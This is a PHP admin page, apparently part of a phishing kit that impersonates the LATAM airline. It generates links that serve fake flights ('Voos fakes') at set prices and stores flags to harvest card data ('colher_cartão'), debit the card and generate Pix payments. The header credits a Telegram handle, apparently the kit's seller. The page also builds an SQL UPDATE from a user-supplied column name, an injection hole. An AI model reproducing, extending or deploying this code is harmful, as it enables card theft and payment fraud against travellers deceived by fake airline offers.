<?php
session_start();
require_once('config.php');
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fullid'])) {
    $fullid = mysqli_real_escape_string($conn, $_POST['fullid']);
    $dominio = $_SERVER['HTTP_HOST'];
    
    $check = $conn->query("SELECT id FROM links WHERE fullid = '$fullid' AND dominio = '$dominio'");
    if ($check->num_rows == 0) {
        $conn->query("INSERT INTO links (dominio, fullid, tipo_de_busca) VALUES ('$dominio', '$fullid', 'gerador')");
    }
} if (isset($_POST['remover_id'])) {
    $id = mysqli_real_escape_string($conn, $_POST['remover_id']);
    $conn->query("DELETE FROM links WHERE id = '$id'");
    exit('ok');
} if (isset($_POST['remover_todos'])) {
    $dominio = $_SERVER['HTTP_HOST'];
    $conn->query("DELETE FROM links WHERE dominio = '$dominio'");
    exit('ok');
} if (isset($_POST['salvar_edicao'])) {
    $id = mysqli_real_escape_string($conn, $_POST['id']);
    $coluna = mysqli_real_escape_string($conn, $_POST['coluna']);
    $valor = mysqli_real_escape_string($conn, $_POST['valor']);
    
    $conn->query("UPDATE links SET $coluna = '$valor' WHERE id = '$id'");
    exit('ok');
} if (isset($_POST['gerar_link'])) {
    $dominio = $_SERVER['HTTP_HOST'];
    $fullid = str_pad(mt_rand(1, 999999999), 9, '0', STR_PAD_LEFT);
    
    $tipo_de_busca = 'gerador';
    $minimo_de_voos = '10';
    $maximo_de_voos = '10';
    $minimo_por_km_nacional = '0.18';
    $maximo_por_km_nacional = '0.29';
    $minimo_por_km_internacional = '0.09';
    $maximo_por_km_internacional = '0.14';
    $seguro_viagem = '19.85';
    $porcentagem = '25';
    $colher_cartão = '1';
    $debitar_do_cartão = '0';
    $gerar_pix = '1';
    
    $conn->query("INSERT INTO links (dominio, fullid, tipo_de_busca, minimo_de_voos, maximo_de_voos, minimo_por_km_nacional, maximo_por_km_nacional, minimo_por_km_internacional, maximo_por_km_internacional, seguro_viagem, porcentagem, colher_cartão, debitar_do_cartão, gerar_pix) VALUES ('$dominio', '$fullid', '$tipo_de_busca', '$minimo_de_voos', '$maximo_de_voos', '$minimo_por_km_nacional', '$maximo_por_km_nacional', '$minimo_por_km_internacional', '$maximo_por_km_internacional', '$seguro_viagem', '$porcentagem', '$colher_cartão', '$debitar_do_cartão', '$gerar_pix')");
    
    $novo_id = $conn->insert_id;
    
    $resultado = [
        'id' => $novo_id,
        'fullid' => $fullid,
        'dominio' => $dominio,
        'tipo_de_busca' => $tipo_de_busca
    ];
    
    echo json_encode($resultado);
    exit;
}

$dominio = $_SERVER['HTTP_HOST'];
$links = $conn->query("SELECT * FROM links WHERE dominio = '$dominio' ORDER BY id DESC");
if (isset($_POST['buscar_link'])) {
    $id = mysqli_real_escape_string($conn, $_POST['id']);
    $link = $conn->query("SELECT * FROM links WHERE id = '$id'")->fetch_assoc();
    echo json_encode($link);
    exit;
}
?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
         <?php include('theme.php'); ?>
         <div class="overlay"></div>
         <div id="wrapper">
            <?php include('submenu.php'); ?>
            <?php include('menu.php'); ?>
            <div id="main-content">
               <div class="container-fluid">
                  <div class="block-header">
                     <div class="row clearfix">
                        <div class="col-lg-4 col-md-12 col-sm-12">
                           <h1>Olá admin, você está em / Editar Link</h1>
                           <span>TXT_JPGI1 - @TXT_JPGI1 no telegram!</span>
                        </div>
                     </div>
                  </div>
                  
                  <div class="row clearfix">
                     <div class="col-lg-12">
                        <div class="block-body">
                           <section id="links" class="campo" style="margin-top: 20px;">
                              <h3>Links</h3>
                              <div style="margin-bottom: 15px;">
                                 <button onclick="gerar_link(this)" class="btn btn-success">Gerar Link</button>
                              </div>
                              
                              <div id="links_conteudo">
                                 <?php while($link = $links->fetch_assoc()): ?>
                                 <article class="article-link" data-id="<?= $link['id'] ?>" style="padding: 10px; margin-bottom: 10px; border-radius: 5px; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 8px;">
                                    <label style="margin: 0; word-break: break-all;">https://<?= $link['dominio'] ?>/<?= $link['fullid'] ?></label>
                                    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
                                       <button class="btn btn-sm btn-info" onclick="editar_link(this)" data-id="<?= $link['id'] ?>" data-dominio="<?= $link['dominio'] ?>" data-fullid="<?= $link['fullid'] ?>" data-tipo_de_busca="<?= $link['tipo_de_busca'] ?>">
                                          Editar Link
                                       </button>
                                       <button class="btn btn-sm btn-info" onclick="copiarLink('https://<?= $link['dominio'] ?>/<?= $link['fullid'] ?>', this)">
                                          Copiar Link
                                       </button>
                                       <button class="btn btn-sm btn-info" onclick="remover_link(this);" data-id="<?= $link['id'] ?>">
                                          Remover Link
                                       </button>
                                    </div>
                                 </article>
                                 <?php endwhile; ?>
                              </div>
                           </section>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>

      <div id="sucesso" class="toast-sucesso"></div>
      
      <div class="modal fade" id="editarLinkModal" tabindex="-1" role="dialog" aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
            <div class="modal-content">
               <div class="modal-header">
                  <h5 class="modal-title">Editar Link</h5>
                  <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
                     <span aria-hidden="true">&times;</span>
                  </button>
               </div>
               <div class="modal-body">
                  <div class="div_fixed_detalhes">

                     <input type="hidden" id="editar_link_latam_dominio" class="input-editar" data-tela="latam" data-coluna="dominio">
                     
                     <label>Tipo de busca</label>
                     <select id="editar_link_latam_tipo_de_busca" onchange="tipo_de_busca_de_voos(this)" class="form-control input-editar" data-tela="latam" data-coluna="tipo_de_busca">
                        <option value="gerador">Gerador (Voos fakes)</option>
                     </select>
                     
                     <div id="tipo_de_busca_de_voos_gerador">
                        <label>Mínimo de voos</label>
                        <span class="text-muted d-block mb-2">O mínimo de voos a serem gerados</span>
                        <input type="text" id="editar_link_latam_minimo_de_voos" maxlength="2" class="form-control input-editar" data-tela="latam" data-coluna="minimo_de_voos">
                        
                        <label class="mt-3">Máximo de voos</label>
                        <span class="text-muted d-block mb-2">O máximo de voos a serem gerados</span>
                        <input type="text" id="editar_link_latam_maximo_de_voos" maxlength="2" class="form-control input-editar" data-tela="latam" data-coluna="maximo_de_voos">
                        
                        <label class="mt-3">Mínimo por km nacional</label>
                        <span class="text-muted d-block mb-2">Preço mínimo do km para voos nacionais</span>
                        <input type="text" id="editar_link_latam_minimo_por_km_nacional" maxlength="4" onkeyup="corrigir_preço(this,1)" class="form-control input-editar" data-tela="latam" data-coluna="minimo_por_km_nacional">
                        
                        <label class="mt-3">Máximo por km nacional</label>
                        <span class="text-muted d-block mb-2">Preço máximo do km para voos nacionais</span>
                        <input type="text" id="editar_link_latam_maximo_por_km_nacional" maxlength="4" onkeyup="corrigir_preço(this,1)" class="form-control input-editar" data-tela="latam" data-coluna="maximo_por_km_nacional">
                        
                        <label class="mt-3">Mínimo por km internacional</label>
                        <span class="text-muted d-block mb-2">Preço mínimo do km para voos internacionais</span>
                        <input type="text" id="editar_link_latam_minimo_por_km_internacional" maxlength="4" onkeyup="corrigir_preço(this,1)" class="form-control input-editar" data-tela="latam" data-coluna="minimo_por_km_internacional">
                        
                        <label class="mt-3">Máximo por km internacional</label>
                        <span class="text-muted d-block mb-2">Preço máximo do km para voos internacionais</span>
                        <input type="text" id="editar_link_latam_maximo_por_km_internacional" maxlength="4" onkeyup="corrigir_preço(this,1)" class="form-control input-editar" data-tela="latam" data-coluna="maximo_por_km_internacional">
                     </div>
                     
                     <div id="tipo_de_busca_de_voos_api" style="display: none;">
                        <label>Porcentagem %</label>
                        <span class="text-muted d-block mb-2">Porcentagem a tirar do valor original das passagens, por exemplo: 1000 reais - 75% = 250 reais</span>
                        <input type="text" id="editar_link_latam_porcentagem" maxlength="2" class="form-control input-editar" data-tela="latam" data-coluna="porcentagem">
                     </div>
                     
                     <label class="mt-3">Seguro Viagem</label>
                     <span class="text-muted d-block mb-2">Preço do seguro viagem, por passageiro por dia.</span>
                     <input type="text" id="editar_link_latam_seguro_viagem" onkeyup="corrigir_preço(this,1)" class="form-control input-editar" data-tela="latam" data-coluna="seguro_viagem">

                     <input type="hidden" id="editar_link_latam_colher_cartão" class="input-editar" data-tela="latam" data-coluna="colher_cartão">
                     <input type="hidden" id="editar_link_latam_debitar_do_cartão" class="input-editar" data-tela="latam" data-coluna="debitar_do_cartão">
                     <input type="hidden" id="editar_link_latam_gerar_pix" class="input-editar" data-tela="latam" data-coluna="gerar_pix">
                     <input type="hidden" id="editar_link_latam_redirect" class="form-control input-editar" data-tela="latam" data-coluna="redirect">
                  </div>
               </div>
               <div class="modal-footer">
                  <button type="button" class="btn btn-sm btn-info" data-dismiss="modal">Cancelar</button>
                  <button type="button" id="editar_link_salvar_alterações_latam" class="btn btn-sm btn-info" onclick="editar_link_salvar_alterações(this)">Salvar alterações</button>
               </div>
            </div>
         </div>
      </div>
      
      <script>
let linkIdAtual = null;

function mostrarSucesso(texto) {
    const sucessoDiv = document.getElementById('sucesso');
    sucessoDiv.textContent = texto;
    sucessoDiv.classList.add('mostrar');
    setTimeout(() => {
        sucessoDiv.classList.remove('mostrar');
    }, 3000);
}

function copiarLink(link, botao) {
    const input = document.createElement('input');
    input.value = link;
    document.body.appendChild(input);
    input.select();

    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(input.value).then(() => {
            document.body.removeChild(input);
            mostrarSucesso('Link copiado com sucesso!');
        }).catch(() => {
            document.execCommand('copy');
            document.body.removeChild(input);
            mostrarSucesso('Link copiado com sucesso!');
        });
    } else {
        document.execCommand('copy');
        document.body.removeChild(input);
        mostrarSucesso('Link copiado com sucesso!');
    }
}

function gerar_link(botao) {
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'gerar_link=1'
    })
    .then(response => response.json())
    .then(data => {
        const novoArtigo = document.createElement('article');
        novoArtigo.className = 'article-link';
        novoArtigo.setAttribute('data-id', data.id);
        novoArtigo.style.cssText = 'padding: 10px; margin-bottom: 10px; border-radius: 5px; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 8px;';
        
        novoArtigo.innerHTML = `
            <label style="margin: 0; word-break: break-all;">https://${data.dominio}/${data.fullid}</label>
            <div style="display: flex; flex-wrap: wrap; gap: 5px;">
                <button class="btn btn-sm btn-info" onclick="editar_link(this)" data-id="${data.id}" data-dominio="${data.dominio}" data-fullid="${data.fullid}" data-tipo_de_busca="${data.tipo_de_busca}">
                    Editar Link
                </button>
                <button class="btn btn-sm btn-info" onclick="copiarLink('https://${data.dominio}/${data.fullid}', this)">
                    Copiar Link
                </button>
                <button class="btn btn-sm btn-info" onclick="remover_link(this);" data-id="${data.id}">
                    Remover Link
                </button>
            </div>
        `;
        
        document.getElementById('links_conteudo').prepend(novoArtigo);
        mostrarSucesso('Link gerado com sucesso!');
    });
}

function remover_link(botao) {
    //if (!confirm('Tem certeza que deseja remover este link?')) return;
    
    const id = botao.getAttribute('data-id');
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'remover_id=' + id
    }).then(() => {
        botao.closest('article').remove();
        mostrarSucesso('Link removido com sucesso!');
    });
}

function remover_todos_os_links(botao) {
    if (!confirm('Tem certeza que deseja remover TODOS os links?')) return;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'remover_todos=1'
    }).then(() => {
        document.getElementById('links_conteudo').innerHTML = '';
        mostrarSucesso('Todos os links removidos com sucesso!');
    });
}

function editar_link(botao) {
    linkIdAtual = botao.getAttribute('data-id');
  
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'buscar_link=1&id=' + linkIdAtual
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('editar_link_latam_dominio').value = data.dominio || '';
        document.getElementById('editar_link_latam_tipo_de_busca').value = data.tipo_de_busca || 'gerador';
        document.getElementById('editar_link_latam_minimo_de_voos').value = data.minimo_de_voos || '';
        document.getElementById('editar_link_latam_maximo_de_voos').value = data.maximo_de_voos || '';
        document.getElementById('editar_link_latam_minimo_por_km_nacional').value = data.minimo_por_km_nacional || '';
        document.getElementById('editar_link_latam_maximo_por_km_nacional').value = data.maximo_por_km_nacional || '';
        document.getElementById('editar_link_latam_minimo_por_km_internacional').value = data.minimo_por_km_internacional || '';
        document.getElementById('editar_link_latam_maximo_por_km_internacional').value = data.maximo_por_km_internacional || '';
        document.getElementById('editar_link_latam_seguro_viagem').value = data.seguro_viagem || '';
        document.getElementById('editar_link_latam_porcentagem').value = data.porcentagem || '';
        document.getElementById('editar_link_latam_colher_cartão').value = data['colher_cartão'] || '1';
        document.getElementById('editar_link_latam_debitar_do_cartão').value = data['debitar_do_cartão'] || '1';
        document.getElementById('editar_link_latam_gerar_pix').value = data.gerar_pix || '1';
        document.getElementById('editar_link_latam_redirect').value = data.redirect || '';
        
        tipo_de_busca_de_voos(document.getElementById('editar_link_latam_tipo_de_busca'));
        
        $('#editarLinkModal').modal('show');
    });
}

function tipo_de_busca_de_voos(select) {
    const valor = select.value;
    if (valor === 'gerador') {
        document.getElementById('tipo_de_busca_de_voos_gerador').style.display = 'block';
        document.getElementById('tipo_de_busca_de_voos_api').style.display = 'none';
    } else {
        document.getElementById('tipo_de_busca_de_voos_gerador').style.display = 'none';
        document.getElementById('tipo_de_busca_de_voos_api').style.display = 'block';
    }
}

function corrigir_preço(input, casas) {
    let valor = input.value.replace(/[^\d]/g, '');
    if (valor.length > 0) {
        valor = (parseInt(valor) / 100).toFixed(casas);
        input.value = valor;
    }
}

function editar_link_salvar_alterações(botao) {
    const campos = document.querySelectorAll('.input-editar');
    let promises = [];
    
    campos.forEach(campo => {
        const coluna = campo.getAttribute('data-coluna');
        const valor = campo.value;
        
        if (coluna && linkIdAtual) {
            const formData = new URLSearchParams();
            formData.append('salvar_edicao', '1');
            formData.append('id', linkIdAtual);
            formData.append('coluna', coluna);
            formData.append('valor', valor);
            
            promises.push(
                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
            );
        }
    });
    
    Promise.all(promises).then(() => {
        mostrarSucesso('Alterações salvas com sucesso!');
        $('#editarLinkModal').modal('hide');
        location.reload();
    });
}
</script>
   </body>
</html>